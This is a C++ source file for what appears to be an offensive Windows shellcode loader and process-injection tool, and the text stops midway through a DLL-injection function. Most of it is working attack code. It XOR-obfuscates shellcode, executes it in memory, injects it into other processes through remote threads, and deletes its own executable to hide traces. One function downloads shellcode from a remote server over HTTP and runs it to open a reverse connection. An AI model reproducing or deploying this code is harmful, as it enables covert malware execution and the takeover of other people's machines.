#define _CRT_SECURE_NO_WARNINGS
#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>
#include <shlobj.h>
#include <tchar.h>
#include <WinInet.h>
#include <Psapi.h>
#include <ImageHlp.h>
#include <stddef.h>
#pragma comment(lib,"Imagehlp.lib")
#pragma comment(lib, "WinInet.lib")

namespace ShellCodeInjectModule
{
	int EnumProcess()
	{
		HANDLE SnapShot;
		PROCESSENTRY32 pe32;
		SnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		pe32.dwSize = sizeof(PROCESSENTRY32);
		if (Process32First(SnapShot, &pe32) == FALSE)
			return 0;
		while (1)
		{
			if (Process32Next(SnapShot, &pe32) == FALSE)
				return 0;
			BOOL is_64 = FALSE;
			HANDLE handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
			IsWow64Process(handle, &is_64);
			if (is_64 == TRUE)
			{
				printf("[*] PID：%6i | 位数：x32 | 进程名：%-20s \n", pe32.th32ProcessID, pe32.szExeFile);
			}
			else
			{
				printf("[*] PID：%6i | 位数：x64 | 进程名：%-20s \n", pe32.th32ProcessID, pe32.szExeFile);
			}
			CloseHandle(handle);
		}
		return 1;
	}

	bool IncreaseSelfAuthority()
	{
		HANDLE token_handle;
		if (OpenProcessToken(GetCurrentProcess(),       
			TOKEN_ALL_ACCESS,                            
			&token_handle                                
			))
		{
			printf("[+] 获取自身Token\n");
		}
		LUID luid;
		if (LookupPrivilegeValue(NULL,                  
			SE_DEBUG_NAME,                              
			&luid                                       
			))
		{
			printf("[+] 查询进程特权\n");
		}
		TOKEN_PRIVILEGES tkp;
		tkp.PrivilegeCount = 1;
		tkp.Privileges[0].Luid = luid;
		tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
		if (AdjustTokenPrivileges(token_handle,    
			FALSE,                                 
			&tkp,                                  
			sizeof(tkp),                           
			NULL,                                  
			NULL                                   
			))
		{
			return true;
		}
		return false;
	}

	BOOL SelfDel()
	{
		SHELLEXECUTEINFO sei;
		TCHAR szModule[MAX_PATH], szComspec[MAX_PATH], szParams[MAX_PATH];
		if ((GetModuleFileName(0, szModule, MAX_PATH) != 0) &&
			(GetShortPathName(szModule, szModule, MAX_PATH) != 0) &&
			(GetEnvironmentVariable("COMSPEC", szComspec, MAX_PATH) != 0))
		{
			lstrcpy(szParams, "/c del ");
			lstrcat(szParams, szModule);
			lstrcat(szParams, " > nul");
			sei.cbSize = sizeof(sei);
			sei.hwnd = 0;
			sei.lpVerb = "Open";
			sei.lpFile = szComspec;
			sei.lpParameters = szParams;
			sei.lpDirectory = 0; sei.nShow = SW_HIDE;
			sei.fMask = SEE_MASK_NOCLOSEPROCESS;
			if (ShellExecuteEx(&sei))
			{
				SetPriorityClass(sei.hProcess, IDLE_PRIORITY_CLASS);
				SetPriorityClass(GetCurrentProcess(), REALTIME_PRIORITY_CLASS);
				SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);
				SHChangeNotify(SHCNE_DELETE, SHCNF_PATH, szModule, 0);
				return TRUE;
			}
		}
		return FALSE;
	}

	void Compressed(const char* FileName)
	{
		FILE* fp_read;
		char write_ch;
		if ((fp_read = fopen(FileName, "r")) != NULL)
		{
			while ((write_ch = fgetc(fp_read)) != EOF)
			{
				if (write_ch != L'\n' && write_ch != L'\"' && write_ch != L'\\' && write_ch != L'x' && write_ch != L';')
				{
					printf("%c", write_ch);
				}
			}
		}
		_fcloseall();
	}

	void CompressedToFile(const char* FileName, const char* SaveFileName)
	{
		FILE* fp_read, *fp_write;
		char ch;
		fp_write = fopen(SaveFileName, "w");
		if (fp_write != NULL)
		{
			if ((fp_read = fopen(FileName, "r")) != NULL)
			{
				while ((ch = fgetc(fp_read)) != EOF)
				{
					if (ch != L'\n' && ch != L'\"' && ch != L'\\' && ch != L'x' && ch != L';')
						fputc(ch, fp_write);
				}
			}
			printf("[+] 已储存 => %s", SaveFileName);
		}
		_fcloseall();
	}

	void XorShellCode(const char* FileName, const char *StrPasswd)
	{
		char shellcode[8192] = { 0 };
		FILE* fp = fopen(FileName, "r");
		if (fp != NULL)
		{
			size_t memory_allocation = fread(shellcode, sizeof(char), 8192, fp);
			TCHAR cCode[32] = { 0 };
			_tcscpy(cCode, StrPasswd);
			DWORD Xor_Key = 0;
			for (unsigned int x = 0; x < lstrlen(cCode); x++)
			{
				Xor_Key = Xor_Key * 4 + cCode[x];
			}
			for (unsigned int x = 0; x < memory_allocation; x++)
			{
				shellcode[x] = shellcode[x] ^ Xor_Key;
			}
			for (unsigned int y = 0; y < memory_allocation; y++)
			{
				printf("%c", shellcode[y]);
			}
		}
	}

	void XchgShellCode(const char* FileName, const char* SaveName)
	{
		char shellcode[8192] = { 0 };
		unsigned char save_shell[8192] = { 0 };
		FILE* read_fp, *write_fp;
		read_fp = fopen(FileName, "r");
		if (read_fp != NULL)
		{
			size_t memory_allocation = fread(shellcode, sizeof(char), 8192, read_fp);
			write_fp = fopen(SaveName, "w+");
			if (write_fp != NULL)
			{
				unsigned int char_in_hex;
				unsigned int iterations = strlen(shellcode);
				unsigned int memory_allocation = strlen(shellcode) / 2;
				for (unsigned int i = 0; i < iterations - 1; i++)
				{
					sscanf(shellcode + 2 * i, "%2X", &char_in_hex);
					save_shell[i] = (char)char_in_hex;
				}
				printf("[+] 字节已转为双字节 \n");
				fprintf(write_fp, "\"");
				for (unsigned int x = 0; x < memory_allocation; x++)
				{
					fprintf(write_fp, "\\x%0.2x", save_shell[x]);
					if ((x + 1) % 15 == 0)
					{
						fprintf(write_fp, "\"\n\"");
					}
				}
				fprintf(write_fp, "\";");
				printf("[*] 已写出ShellCode列表 => %s \n", SaveName);
				fclose(write_fp);
			}
		}
		_fcloseall();
	}

	void XorEncodeDeCode(CHAR* FileName, TCHAR* StrPasswd)
	{
		FILE* read_pointer;
		char source[8192] = { 0 };
		unsigned char shellcode[8192] = { 0 };
		char ch;
		if ((read_pointer = fopen(FileName, "r")) != NULL)
		{
			for (int x = 0; (ch = fgetc(read_pointer)) != EOF;)
			{
				if (ch != L'\n' && ch != L'\"' && ch != L'\\' && ch != L'x' && ch != L';')
				{
					source[x] = ch;
					x = x + 1;
				}
			}
		}
		TCHAR cCode[32] = { 0 };
		_tcscpy(cCode, StrPasswd);
		DWORD Xor_Key = 0;
		for (unsigned int x = 0; x < lstrlen(cCode); x++)
		{
			Xor_Key = Xor_Key * 4 + cCode[x];
		}
		printf("unsigned char ShellCode[] = \n\"");
		for (int y = 0; y < strlen(source) / 2; y++)
		{
			unsigned int char_in_hex;
			sscanf(source + 2 * y, "%2x", &char_in_hex);
			shellcode[y] = (char)char_in_hex ^ Xor_Key;
			printf("\\x%x", shellcode[y]);
			if (y % 15 == 0 && y != 0)
			{
				printf("\"\n\"");
			}
		}
		printf("\";\n");
		_fcloseall();
	}

	void InjectSelfCode(char* shellcode)
	{
		unsigned int char_in_hex;
		unsigned int iterations = strlen(shellcode);
		unsigned int memory_allocation = strlen(shellcode) / 2;
		for (unsigned int i = 0; i < iterations - 1; i++)
		{
			sscanf(shellcode + 2 * i, "%2X", &char_in_hex);
			shellcode[i] = (char)char_in_hex;
		}
		void* exec = VirtualAlloc(0, memory_allocation, MEM_COMMIT, PAGE_READWRITE);
		memcpy(exec, shellcode, memory_allocation);
		DWORD ignore;
		VirtualProtect(exec, memory_allocation, PAGE_EXECUTE, &ignore);
		(*(void(*)()) exec)();
	}

	void CompressedOnFormat(const char* FileName)
	{
		FILE* fp_read;
		int memory_allocation = 0;
		char ShellCode[8192] = { 0 };
		if ((fp_read = fopen(FileName, "r")) != NULL)
		{
			char char_in_;
			while ((char_in_ = fgetc(fp_read)) != EOF)
			{
				if (char_in_ != L'\n' && char_in_ != L'\"' && char_in_ != L'\\' && char_in_ != L'x' && char_in_ != L';')
				{
					ShellCode[memory_allocation] = char_in_;
					memory_allocation = memory_allocation + 1;
				}
			}
			_fcloseall();
		}
		unsigned int char_in_hex;
		for (unsigned int x = 0; x < (memory_allocation - 1); x++)
		{
			sscanf(ShellCode + 2 * x, "%02X", &char_in_hex);
			ShellCode[x] = (char)char_in_hex;
		}
		printf("[+] 解码地址: %x \n", (ULONG64)ShellCode);
		void* exec = VirtualAlloc(0, memory_allocation, MEM_COMMIT, PAGE_READWRITE);
		memcpy(exec, ShellCode, memory_allocation);
		DWORD ignore;
		VirtualProtect(exec, memory_allocation, PAGE_EXECUTE, &ignore);
		(*(void(*)()) exec)();
	}

	void ReadShellCodeOnMemory(char* FileName)
	{
		char shellcode[8192] = { 0 };
		FILE* fp = fopen(FileName, "r");
		if (fp != NULL)
		{
			size_t memory_allocation = fread(shellcode, sizeof(char), 8192, fp);
			unsigned int char_in_hex;
			for (unsigned int x = 0; x < memory_allocation - 1; x++)
			{
				sscanf(shellcode + 2 * x, "%02X", &char_in_hex);
				shellcode[x] = (char)char_in_hex;
			}
			printf("[+] 解码地址: %x \n", (ULONG64)shellcode);
			fclose(fp);
			void* exec = VirtualAlloc(0, memory_allocation, MEM_COMMIT, PAGE_READWRITE);
			memcpy(exec, shellcode, memory_allocation);
			DWORD ignore;
			VirtualProtect(exec, memory_allocation, PAGE_EXECUTE, &ignore);
			(*(void(*)()) exec)();
		}
		else
		{
			printf("[-] 读取文件失败,权限不足. \n");
		}
		_fcloseall();
	}

	bool InjectCode(DWORD pid, char* shellcode)
	{
		HANDLE Handle;
		HANDLE remoteThread;
		PVOID remoteBuffer;
		unsigned char source[8192] = { 0 };
		unsigned int char_in_hex;
		unsigned int iterations = strlen(shellcode);
		unsigned int memory_allocation = strlen(shellcode) / 2;
		for (unsigned int i = 0; i < iterations - 1; i++)
		{
			sscanf(shellcode + 2 * i, "%2X", &char_in_hex);
			source[i] = (char)char_in_hex;
		}
		printf("[*] 开始注入进程PID => %d \n", pid, memory_allocation);
		Handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
		if (Handle != NULL)
		{
			printf("[+] 打开进程: %d \n", (ULONG64)Handle);
		}
		else
		{
			printf("[-] 打开进程失败\n");
			return false;
		}
		remoteBuffer = VirtualAllocEx(Handle, NULL, sizeof(source), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
		if (remoteBuffer != NULL)
		{
			printf("[+] 已设置权限: %d \n", (ULONG64)remoteBuffer);
		}
		else
		{
			printf("[-] 设置权限失败 \n");
			return false;
		}
		WriteProcessMemory(Handle, remoteBuffer, source, sizeof(source), NULL);
		remoteThread = CreateRemoteThread(Handle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
		if (remoteThread != NULL)
		{
			printf("[*] 创建线程ID => %d \n", (ULONG64)remoteThread);
		}
		else
		{
			printf("[-] 线程启动失败 \n");
			return false;
		}
		CloseHandle(Handle);
		return true;
	}

	char* GetUrlInShellCode(const char* URL, const char* SubPath)
	{
		HINTERNET hInternet, hConnect, hRequest = NULL;
		DWORD dwOpenRequestFlags, dwRet = 0;
		unsigned char* pResponseHeaderIInfo = NULL;
		DWORD dwResponseHeaderIInfoSize = 2048;
		DWORD dwBufSize = 64 * 2048;
		BYTE* ShellCode = NULL;
		BOOL bRet = false;
		hInternet = ::InternetOpen("Get ShellCode Ver 1.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
		if (hInternet == NULL)
			return NULL;
		hConnect = ::InternetConnect(hInternet, URL, INTERNET_DEFAULT_HTTP_PORT, 0, 0, INTERNET_SERVICE_HTTP, 0, 0);
		if (NULL == hConnect)
			return NULL;
		dwOpenRequestFlags = INTERNET_FLAG_IGNORE_REDIRECT_TO_HTTP | INTERNET_FLAG_KEEP_CONNECTION |
			INTERNET_FLAG_NO_AUTH | INTERNET_FLAG_NO_COOKIES | INTERNET_FLAG_NO_UI | INTERNET_FLAG_RELOAD;
		hRequest = HttpOpenRequest(hConnect, "GET", SubPath, NULL, NULL, NULL, dwOpenRequestFlags, 0);
		if (NULL == hRequest)
			return NULL;
		bRet = HttpSendRequest(hRequest, NULL, 0, NULL, 0);
		if (false == bRet)
			return NULL;
		pResponseHeaderIInfo = new unsigned char[dwResponseHeaderIInfoSize];
		if (NULL == pResponseHeaderIInfo)
			return NULL;
		RtlZeroMemory(pResponseHeaderIInfo, dwResponseHeaderIInfoSize);
		bRet = HttpQueryInfo(hRequest, HTTP_QUERY_RAW_HEADERS_CRLF, pResponseHeaderIInfo, &dwResponseHeaderIInfoSize, NULL);
		if (false == bRet)
			return NULL;
		ShellCode = new BYTE[dwBufSize];
		RtlZeroMemory(ShellCode, dwBufSize);
		bRet = InternetReadFile(hRequest, ShellCode, dwBufSize, &dwRet);
		if (false == bRet)
			return NULL;
		return (char*)ShellCode;
	}

	bool WebPageBounceShellCode(const char* address, const char* page)
	{
		char* shellcode = GetUrlInShellCode(address, page);
		if (shellcode != NULL)
		{
			printf("[+] 已从远程下载 \n");
			unsigned int char_in_hex;
			unsigned int iterations = strlen(shellcode);
			unsigned int memory_allocation = strlen(shellcode) / 2;
			for (unsigned int i = 0; i < iterations - 1; i++)
			{
				sscanf(shellcode + 2 * i, "%2X", &char_in_hex);
				shellcode[i] = (char)char_in_hex;
			}
			printf("[+] ShellCode 已解码 \n");
			void* exec = VirtualAlloc(0, memory_allocation, MEM_COMMIT, PAGE_READWRITE);
			memcpy(exec, shellcode, memory_allocation);
			DWORD ignore;
			VirtualProtect(exec, memory_allocation, PAGE_EXECUTE, &ignore);
			printf("[*] 执行反弹 \n");
			(*(void(*)()) exec)();
		}
		else
		{
			printf("[-] 无法连接服务器,或ShellCode异常 \n");
			return false;
		}
		return false;
	}

	void ReadXorShellCodeOnMemory(char* FileName, const char * StrPasswd)
	{
		char shellcode[8192] = { 0 };
		FILE* fp = fopen(FileName, "r");
		if (fp != NULL)
		{
			size_t memory_allocation = fread(shellcode, sizeof(char), 8192, fp);
			TCHAR cCode[32] = { 0 };
			_tcscpy(cCode, StrPasswd);
			DWORD Xor_Key = 0;
			for (unsigned int x = 0; x < lstrlen(cCode); x++)
			{
				Xor_Key = Xor_Key * 4 + cCode[x];
			}
			for (unsigned int x = 0; x < memory_allocation; x++)
			{
				shellcode[x] = shellcode[x] ^ Xor_Key;
			}
			printf("[+] 解码ShellCode字节 => %d bytes \n", memory_allocation);
			unsigned int char_in_hex;
			for (unsigned int x = 0; x < memory_allocation - 1; x++)
			{
				sscanf(shellcode + 2 * x, "%02X", &char_in_hex);
				shellcode[x] = (char)char_in_hex;
			}
			printf("[+] 格式化ShellCode字节地址 => %x \n", (ULONG64)shellcode);
			fclose(fp);
			void* exec = VirtualAlloc(0, memory_allocation, MEM_COMMIT, PAGE_READWRITE);
			memcpy(exec, shellcode, memory_allocation);
			DWORD ignore;
			VirtualProtect(exec, memory_allocation, PAGE_EXECUTE, &ignore);
			printf("[*] 激活当前反弹线程 => %x \n", (ULONG64)exec);
			(*(void(*)()) exec)();
		}
		else
		{
			printf("[-] 读取文件失败,权限不足. \n");
		}
		_fcloseall();
	}

	bool InjectXorCode(DWORD pid, char* FileName, const char * StrPasswd)
	{
		HANDLE Handle = NULL;
		HANDLE remoteThread;
		PVOID remoteBuffer;
		char source[8192] = { 0 };
		unsigned char shellcode[8192] = { 0 };
		FILE* fp = fopen(FileName, "r");
		if (fp != NULL)
		{
			size_t len = fread(source, sizeof(char), 8192, fp);
			TCHAR cCode[32] = { 0 };
			_tcscpy(cCode, StrPasswd);
			DWORD Xor_Key = 0;
			for (unsigned int x = 0; x < lstrlen(cCode); x++)
			{
				Xor_Key = Xor_Key * 4 + cCode[x];
			}
			for (unsigned int x = 0; x < len; x++)
			{
				source[x] = source[x] ^ Xor_Key;
			}
			printf("[+] 解码ShellCode字节 => %d bytes \n", len);
			unsigned int char_in_hex;
			unsigned int iterations = strlen(source);
			unsigned int memory_allocation = strlen(source) / 2;
			printf("[+] 读入ShellCode长度 => %d \n", strlen(source));
			for (unsigned int i = 0; i < iterations - 1; i++)
			{
				sscanf(source + 2 * i, "%2X", &char_in_hex);
				shellcode[i] = (char)char_in_hex;
			}
			printf("[*] 开始注入进程PID => %d 长度 => %d \n", pid, memory_allocation);
			Handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
			if (Handle != NULL)
			{
				printf("[+] 打开进程: %d \n", (ULONG64)Handle);
			}
			else
			{
				printf("[-] 打开进程失败\n");
				return false;
			}
			remoteBuffer = VirtualAllocEx(Handle, NULL, sizeof(shellcode), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
			if (remoteBuffer != NULL)
			{
				printf("[+] 已设置权限: %x \n", (ULONG64)remoteBuffer);
			}
			else
			{
				printf("[-] 设置权限失败 \n");
				return false;
			}
			WriteProcessMemory(Handle, remoteBuffer, shellcode, sizeof(shellcode), NULL);
			remoteThread = CreateRemoteThread(Handle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
			if (remoteThread != NULL)
			{
				printf("[*] 创建线程ID => %x \n", (ULONG64)remoteThread);
			}
			else
			{
				printf("[-] 线程启动失败 \n");
				return false;
			}
		}
		fclose(fp);
		CloseHandle(Handle);
		return true;
	}
}

namespace DllInjectModule
{
	DWORD FindProcessID(LPCTSTR szProcessName)
	{
		DWORD dwPID = 0xFFFFFFFF;
		HANDLE hSnapShot = INVALID_HANDLE_VALUE;
		PROCESSENTRY32 pe;
		pe.dwSize = sizeof(PROCESSENTRY32);
		hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);
		Process32First(hSnapShot, &pe);
		do
		{
			if (!_tcsicmp(szProcessName, (LPCTSTR)pe.szExeFile))
			{
				dwPID = pe.th32ProcessID;
				break;
			}
		} while (Process32Next(hSnapShot, &pe));
		CloseHandle(hSnapShot);
		return dwPID;
	}

	DWORD64 GetDllBase(HANDLE hProcess, DWORD64 dwFunctionAddress, BOOL b32)
	{
		WORD MZ = 0;
		DWORD dwlfanew = 0;
		DWORD PE00 = 0;
		if (b32)
		{
			dwFunctionAddress = dwFunctionAddress & 0xFFFF0000;
		}
		else
		{
			dwFunctionAddress = dwFunctionAddress & 0xFFFFFFFFFFFF0000;
		}
		do
		{
			ReadProcessMemory(hProcess, (LPCVOID)dwFunctionAddress, &MZ, 2, NULL);
			if (IMAGE_DOS_SIGNATURE == MZ)
			{
				ReadProcessMemory(hProcess, (LPCVOID)(dwFunctionAddress + 0x003c), &dwlfanew, 4, NULL);
				ReadProcessMemory(hProcess, (LPCVOID)(dwFunctionAddress + dwlfanew), &PE00, 4, NULL);
				if (IMAGE_NT_SIGNATURE == PE00)
				{
					return dwFunctionAddress;
				}
			}
			dwFunctionAddress = dwFunctionAddress - 0x10000;
		} while (dwFunctionAddress >= 0x10000000);
		return 0;
	}

	BOOL JudgePE32Or64(char* lpszDllPath)
	{
		HANDLE hFile = CreateFile(lpszDllPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_ARCHIVE, NULL);
		if (INVALID_HANDLE_VALUE == hFile)
		{
			return FALSE;
		}
		HANDLE hFileMap = CreateFileMapping(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
		if (!hFileMap)
		{
			CloseHandle(hFile);
			return FALSE;
		}
		LPVOID lpMemory = MapViewOfFile(hFileMap, FILE_MAP_READ, 0, 0, 0);
		if (!lpMemory)
		{
			CloseHandle(hFileMap);
			CloseHandle(hFile);
			return FALSE;
		}
		PIMAGE_DOS_HEADER pDosHead = (PIMAGE_DOS_HEADER)lpMemory;
		if (IMAGE_DOS_SIGNATURE == pDosHead->e_magic)
		{
			DWORD dwlfanew = pDosHead->e_lfanew;
			PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((DWORD64)pDosHead + dwlfanew);
			if (IMAGE_NT_SIGNATURE == pNtHeaders->Signature)
			{
				if (IMAGE_FILE_MACHINE_AMD64 == pNtHeaders->FileHeader.Machine || IMAGE_FILE_MACHINE_IA64 == pNtHeaders->FileHeader.Machine)
				{
					return FALSE;
				}
			}
		}
		return TRUE;
	}

	BOOL GetProcessBaseAddress(HMODULE* lpBaseAddress, HANDLE hProcess)
	{
		EnumProcessModules(hProcess, lpBaseAddress, sizeof(HMODULE), NULL);
		return TRUE;
	}

	DWORD64 GetFuncInDll(HANDLE hProcess, DWORD64 dwDllBaseAddress, char* lpszFuncName, BOOL b32)
	{
		DWORD dwlfanew = 0;
		DWORD dwFuncNameLen = ::lstrlen(lpszFuncName) + 1;
		char szTemp[MAX_PATH] = { 0 };
		ReadProcessMemory(hProcess, (LPCVOID)(dwDllBaseAddress + 0x003c), &dwlfanew, 4, NULL);
		DWORD dwExportRVA = 0;
		if (b32)
		{
			ReadProcessMemory(hProcess, (LPCVOID)(dwDllBaseAddress + dwlfanew + 4 + 20 + 96), &dwExportRVA, 4, NULL);
		}
		else
		{
			ReadProcessMemory(hProcess, (LPCVOID)(dwDllBaseAddress + dwlfanew + 4 + 20 + 112), &dwExportRVA, 4, NULL);
		}
		DWORD dwNumberOfNames = 0;
		ReadProcessMemory(hProcess, (LPCVOID)(dwDllBaseAddress + dwExportRVA + 24), &dwNumberOfNames, 4, NULL);
		DWORD dwAddressOfNames = 0;
		ReadProcessMemory(hProcess, (LPCVOID)(dwDllBaseAddress + dwExportRVA + 32), &dwAddressOfNames, 4, NULL);
		DWORD dwNameRVA = 0;
		for (DWORD i = 0; i < dwNumberOfNames; i++)
		{
			ReadProcessMemory(hProcess, (LPCVOID)(dwDllBaseAddress + dwAddressOfNames + 4 * i), &dwNameRVA, 4, NULL);
			ReadProcessMemory(hProcess, (LPCVOID)(dwDllBaseAddress + dwNameRVA), szTemp, dwFuncNameLen, NULL);
			if (0 == lstrcmpi(lpszFuncName, szTemp))  
			{
				DWORD dwAddressOfNameOrdinals = 0;
				ReadProcessMemory(hProcess, (LPCVOID)(dwDllBaseAddress + dwExportRVA + 36), &dwAddressOfNameOrdinals, 4, NULL);
				WORD wHint = 0;
				ReadProcessMemory(hProcess, (LPCVOID)(dwDllBaseAddress + dwAddressOfNameOrdinals + 2 * i), &wHint, 2, NULL);
				DWORD dwAddressOfFunctions = 0;
				ReadProcessMemory(hProcess, (LPCVOID)(dwDllBaseAddress + dwExportRVA + 28), &dwAddressOfFunctions, 4, NULL);
				DWORD dwFuncRVA = 0;
				ReadProcessMemory(hProcess, (LPCVOID)(dwDllBaseAddress + dwAddressOfFunctions + 4 * wHint), &dwFuncRVA, 4, NULL);
				DWORD64 dwRet = dwDllBaseAddress + dwFuncRVA;
				return dwRet;
			}
		}
		return 0;
	}

	DWORD64 GetProcessDllBaseAddress(HANDLE hProcess, HMODULE hBaseAddress, char szDllName[MAX_PATH], BOOL b32)
	{
		DWORD64 dwBaseAddress = (DWORD64)hBaseAddress;
		DWORD dwlfanew = 0;
		ReadProcessMemory(hProcess, (LPCVOID)(dwBaseAddress + 0x003c), &dwlfanew, 4, NULL);
		if (b32)
		{
			DWORD dwIATRVA = 0;
			DWORD dwIATSize = 0;
			ReadProcessMemory(hProcess, (LPCVOID)(dwBaseAddress + dwlfanew + 4 + 20 + 96 + 8), &dwIATRVA, 4, NULL);
			ReadProcessMemory(hProcess, (LPCVOID)(dwBaseAddress + dwlfanew + 4 + 20 + 96 + 8 + 4), &dwIATSize, 4, NULL);
			DWORD dwIndex = (dwIATSize - 1) / 20;
			DWORD dwOffsetDllName = 0;
			DWORD dwDllNameLen = lstrlen(szDllName) + 1;
			char szTemp[MAX_PATH] = { 0 };
			for (DWORD i = 0; i < dwIndex; i++)
			{
				ReadProcessMemory(hProcess, (LPCVOID)(dwBaseAddress + dwIATRVA + i * 20 + 12), &dwOffsetDllName, 4, NULL);
				ReadProcessMemory(hProcess, (LPCVOID)(dwBaseAddress + dwOffsetDllName), szTemp, dwDllNameLen, NULL);
				if (0 == lstrcmpi(szDllName, szTemp))  
				{
					DWORD dwFunctionAddress = 0;
					ReadProcessMemory(hProcess, (LPCVOID)(dwBaseAddress + dwIATRVA + i * 20 + 16), &dwFunctionAddress, 4, NULL);
					ReadProcessMemory(hProcess, (LPCVOID)(dwBaseAddress + dwFunctionAddress), &dwFunctionAddress, 4, NULL);
					DWORD64 dwRet = GetDllBase(hProcess, dwFunctionAddress, b32);
					return dwRet;
				}
			}
		}
		else
		{
			DWORD dwIATRVA = 0;
			DWORD dwIATSize = 0;
			ReadProcessMemory(hProcess, (LPCVOID)(dwBaseAddress + dwlfanew + 4 + 20 + 112 + 8), &dwIATRVA, 4, NULL);
			ReadProcessMemory(hProcess, (LPCVOID)(dwBaseAddress + dwlfanew + 4 + 20 + 112 + 8 + 4), &dwIATSize, 4, NULL);
			DWORD dwIndex = (dwIATSize - 1) / 20;
			DWORD dwOffsetDllName = 0;
			DWORD dwDllNameLen = lstrlen(szDllName) + 1;
			char szTemp[MAX_PATH] = { 0 };
			for (DWORD i = 0; i < dwIndex; i++)
			{
				ReadProcessMemory(hProcess, (LPCVOID)(dwBaseAddress + dwIATRVA + i * 20 + 12), &dwOffsetDllName, 4, NULL);
				ReadProcessMemory(hProcess, (LPCVOID)(dwBaseAddress + dwOffsetDllName), szTemp, dwDllNameLen, NULL);
				if (0 == lstrcmpi(szDllName, szTemp))  
				{
					DWORD64 dwFunctionAddress = 0;
					ReadProcessMemory(hProcess, (LPCVOID)(dwBaseAddress + dwIATRVA + i * 20 + 16), &dwFunctionAddress, 4, NULL);
					ReadProcessMemory(hProcess, (LPCVOID)(dwBaseAddress + dwFunctionAddress), &dwFunctionAddress, 8, NULL);
					DWORD64 dwRet = GetDllBase(hProcess, dwFunctionAddress, b32);
					return dwRet;
				}
			}
		}
		return 0;
	}

	BOOL GetProcessDllName(HANDLE hProcess, HMODULE hBaseAddress, char szDllNameArray[MAX_PATH][MAX_PATH], DWORD& dwDllNum, BOOL b32)
	{
		DWORD64 dwBaseAddress = (DWORD64)hBaseAddress;
		WORD MZ = 0;
		DWORD dwlfanew = 0;
		DWORD PE00 = 0;
		DWORD64 dwTemp = 0;
		ReadProcessMemory(hProcess, (LPCVOID)dwBaseAddress, &MZ, 2, &dwTemp);
		if (2 != dwTemp)
		{
			return FALSE;
		}
		if (MZ != IMAGE_DOS_SIGNATURE)
		{
			return FALSE;
		}
		ReadProcessMemory(hProcess, (LPCVOID)(dwBaseAddress + 0x003c), &dwlfanew, 4, &dwTemp);
		ReadProcessMemory(hProcess, (LPCVOID)(dwBaseAddress + dwlfanew), &PE00, 4, &dwTemp);
		if (4 != dwTemp)
		{
			return FALSE;
		}
		if (PE00 != IMAGE_NT_SIGNATURE)
		{
			return FALSE;
		}
		if (b32)
		{
			DWORD dwIATRVA = 0;
			DWORD dwIATSize = 0;
			ReadProcessMemory(hProcess, (LPCVOID)(dwBaseAddress + dwlfanew + 4 + 20 + 96 + 8), &dwIATRVA, 4, NULL);
			ReadProcessMemory(hProcess, (LPCVOID)(dwBaseAddress + dwlfanew + 4 + 20 + 96 + 8 + 4), &dwIATSize, 4, NULL);
			DWORD dwIndex = (dwIATSize - 1) / 20;
			dwDllNum = dwIndex;
			DWORD dwOffsetDllName = 0;
			char szTemp[50] = { 0 };
			for (DWORD i = 0; i < dwIndex; i++)
			{
				ReadProcessMemory(hProcess, (LPCVOID)(dwBaseAddress + dwIATRVA + i * 20 + 12), &dwOffsetDllName, 4, NULL);
				ReadProcessMemory(hProcess, (LPCVOID)(dwBaseAddress + dwOffsetDllName), szTemp, 50, NULL);
				lstrcpy(szDllNameArray[i], szTemp);
			}
		}
		else
		{
			DWORD dwIATRVA = 0;
			DWORD dwIATSize = 0;
			ReadProcessMemory(hProcess, (LPCVOID)(dwBaseAddress + dwlfanew + 4 + 20 + 112 + 8), &dwIATRVA, 4, NULL);
			ReadProcessMemory(hProcess, (LPCVOID)(dwBaseAddress + dwlfanew + 4 + 20 + 112 + 8 + 4), &dwIATSize, 4, NULL);
			DWORD dwIndex = (dwIATSize - 1) / 20;
			dwDllNum = dwIndex;
			DWORD dwOffsetDllName = 0;
			char szTemp[50] = { 0 };
			for (DWORD i = 0; i < dwIndex; i++)
			{
				ReadProcessMemory(hProcess, (LPCVOID)(dwBaseAddress + dwIATRVA + i * 20 + 12), &dwOffsetDllName, 4, NULL);
				ReadProcessMemory(hProcess, (LPCVOID)(dwBaseAddress + dwOffsetDllName), szTemp, 50, NULL);
				lstrcpy(szDllNameArray[i], szTemp);
			}
		}
		return TRUE;
	}

	BOOL RemoteProcessInject(DWORD dwID, char* lpszDllPath)
	{
		HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwID);
		if (NULL == hProcess)
		{
			return FALSE;
		}
		BOOL b32 = FALSE;
		IsWow64Process(hProcess, &b32);
		BOOL bDll32 = JudgePE32Or64(lpszDllPath);
		if (b32)
		{
			if (!bDll32)
			{
				std::cout << "[-] 请传入32位DLL进行注入" << std::endl;
				return FALSE;
			}
		}
		else
		{
			if (bDll32)
			{
				std::cout << "[-] 请传入64位DLL进行注入" << std::endl;
				return FALSE;
			}
		}
		DWORD dwSize = 1 + lstrlen(lpszDllPath);
		LPVOID lpAddr = VirtualAllocEx(hProcess, 0, dwSize, MEM_COMMIT, PAGE_READWRITE);
		if (NULL == lpAddr)
		{
			return FALSE;
		}
		if (!WriteProcessMemory(hProcess, lpAddr, (LPCVOID)lpszDllPath, dwSize, NULL))
		{
			return FALSE;
		}
		HMODULE hBaseAddress = NULL;
		GetProcessBaseAddress(&hBaseAddress, hProcess);
		DWORD64 dwDllBaseAddress = GetProcessDllBaseAddress(hProcess, hBaseAddress, (char*)"kernel32.dll", b32);
		DWORD64 dwFuncAddress = GetFuncInDll(hProcess, dwDllBaseAddress, (char*)"LoadLibraryA", b32);
